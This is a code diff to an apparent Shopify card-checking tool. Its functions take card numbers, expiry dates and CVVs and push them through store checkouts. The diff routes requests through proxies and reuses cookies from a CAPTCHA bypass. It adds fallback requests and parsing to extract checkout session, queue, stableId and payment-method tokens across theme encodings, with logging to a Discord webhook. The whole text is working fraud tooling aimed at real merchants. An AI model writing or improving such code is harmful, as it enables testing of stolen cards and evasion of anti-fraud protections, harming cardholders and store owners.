@@ -1246,7 +1246,7 @@ async def _run_shopify_check_inner(site_url, card_str, proxy_url=None, verbose=F
         print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] Attempt — proxy={proxy_use and proxy_use[:30]}... | captcha_retries={captcha_retries}")
 
     try:
-        async with _create_async_client(proxy_url=None, timeout=20.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
+        async with _create_async_client(proxy_url=proxy_use, timeout=20.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
             # Pre-inject cached cookies from previous CAPTCHA bypass (avoids CAPTCHA entirely)
             if _CAPTCHA_SOLVER_AVAILABLE:
                 try:
@@ -1597,20 +1597,101 @@ async def _do_one_check(session, site_url, cc, mon, year, cvv, fingerprint, prox
         if _ch_key in fingerprint:
             checkout_headers[_ch_key] = fingerprint[_ch_key]
     try:
-        checkout_response = await session.post(f"{site}/cart", headers=checkout_headers, data={"checkout": "", "updates[]": "1"})
+        # Try the standard checkout POST first
+        checkout_response = await session.post(
+            f"{site}/cart",
+            headers=checkout_headers,
+            data={"checkout": "1", "updates[]": "1", "note": ""}
+        )
+        # If we didn't land on a checkout page, try direct GET to /checkout
+        _co_url = str(checkout_response.url)
+        if checkout_response.status_code not in (200,) or "checkouts" not in _co_url:
+            try:
+                _co_get = await session.get(f"{site}/checkout", headers={
+                    **checkout_headers,
+                    "Referer": f"{site}/cart",
+                    "content-type": "text/html",
+                })
+                if _co_get.status_code == 200 and "checkouts" in str(_co_get.url):
+                    checkout_response = _co_get
+            except Exception:
+                pass
     except _NETWORK_ERRORS as e:
-        return {"status": "Error", "message": f"Network: {type(e).__name__}", "debug_steps": _steps}
+        return {"status": "Error", "message": f"Network: {type(e).__name__}", "product": product_title, "price": price, "debug_steps": _steps}
     checkout_page_url = str(checkout_response.url)
     response_text2 = checkout_response.text
+
+    # If cart POST returned non-200 or redirected to /cart (checkout blocked), follow up with GET
+    if checkout_response.status_code not in (200, 302) or "/cart" == checkout_page_url.rstrip("/").split("?")[0].split("/")[-1]:
+        try:
+            _fallback_r = await session.get(f"{site}/checkout", headers=checkout_headers)
+            if _fallback_r.status_code == 200 and len(_fallback_r.text) > len(response_text2):
+                response_text2 = _fallback_r.text
+                checkout_page_url = str(_fallback_r.url)
+        except Exception:
+            pass
+
+    # Try multiple session token patterns (Shopify changes encoding between themes)
     x_st = _RE_SESSION_TOKEN.search(response_text2)
     session_token = x_st.group(1) if x_st else None
     if not session_token:
-        return {"status": "Error", "message": "Checkout session failed", "debug_steps": _steps}
+        # Raw JSON (newer Shopify themes)
+        session_token = (
+            find_between(response_text2, '"sessionToken":"', '"')
+            or find_between(response_text2, 'sessionToken&quot;:&quot;', '&quot;')
+            or find_between(response_text2, '"serialized-sessionToken" content="', '"').strip('&quot;').strip('"')
+        )
+        # If still None, try fetching checkout page URL directly
+        if not session_token and "checkouts" in checkout_page_url:
+            try:
+                _direct_r = await session.get(checkout_page_url, headers={
+                    "User-Agent": shop.user_agent,
+                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
+                    "Referer": f"{site}/cart",
+                })
+                if _direct_r.status_code == 200:
+                    _rt2 = _direct_r.text
+                    x_st2 = _RE_SESSION_TOKEN.search(_rt2)
+                    if x_st2:
+                        session_token = x_st2.group(1)
+                        response_text2 = _rt2
+                    if not session_token:
+                        session_token = find_between(_rt2, '"sessionToken":"', '"')
+            except Exception:
+                pass
+
+    if not session_token:
+        _steps.append(f"4. Checkout FAILED: HTTP {checkout_response.status_code} | url={checkout_page_url[:80]}")
+        return {"status": "Error", "message": "Checkout session failed", "product": product_title, "price": price, "debug_steps": _steps}
     _steps.append(f"4. Checkout: HTTP {checkout_response.status_code} | url={checkout_page_url[:60]}")
     _log_verbose(verbose, "✅ Checkout session OK", discord_webhook=discord_console_webhook)
-    queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
-    stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
-    paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
+    queue_token = (
+        find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
+        or find_between(response_text2, '"queueToken":"', '"')
+        or find_between(response_text2, "queueToken':'", "'")
+        or None
+    )
+
+    # stable_id: try entity-encoded first, then raw JSON, then alternate keys
+    stable_id = (
+        find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
+        or find_between(response_text2, '"stableId":"', '"')
+        or find_between(response_text2, 'merchandiseLines&quot;:[{&quot;stableId&quot;:&quot;', '&quot;')
+        or find_between(response_text2, '"merchandiseLines":[{"stableId":"', '"')
+        or ""
+    )
+    if not stable_id:
+        # Try regex for stableId in any context
+        _sid_m = re.search(r'stableId[&\\"\']+\s*:\s*[&\\"\']+([^&\"\'>]+)', response_text2)
+        if _sid_m:
+            stable_id = _sid_m.group(1).replace("&quot;", "").strip()
+
+    paymentMethodIdentifier = (
+        find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
+        or find_between(response_text2, '"paymentMethodIdentifier":"', '"')
+        or find_between(response_text2, "paymentMethodIdentifier':'", "'")
+        or "shopify_payments"  # safe default — Shopify's standard gateway identifier
+    )
     # Extract checkpoint / CAPTCHA token from checkout page (needed by newer Shopify stores)
     _checkpoint_token = find_between(response_text2, 'checkpointToken&quot;:&quot;', '&quot;')
     if not _checkpoint_token:
